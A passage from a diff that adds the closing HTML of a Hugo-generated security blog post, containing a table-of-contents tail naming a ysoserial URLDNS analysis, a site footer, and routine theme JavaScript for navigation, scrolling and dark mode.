+        <li><a href="#ysoserial之urldns分析">ysoserial之URLDNS分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-总结">0x03 总结</a></li>
+    <li><a href="#0x04-参考">0x04 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
